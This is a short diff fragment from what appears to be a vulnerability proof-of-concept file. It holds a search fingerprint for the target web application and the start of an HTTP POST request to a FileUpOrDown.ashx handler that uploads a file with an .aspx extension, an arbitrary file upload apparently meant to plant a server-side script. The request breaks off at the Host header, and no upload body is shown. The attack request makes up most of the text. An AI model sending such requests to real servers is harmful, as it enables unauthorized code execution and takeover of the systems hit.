@@ -5,7 +5,7 @@
 body="/Content/Theme/Standard/"
 ```
 
-## poc
+## POC
 ```
 POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=5B56bf.aspx HTTP/1.1
 Host: 
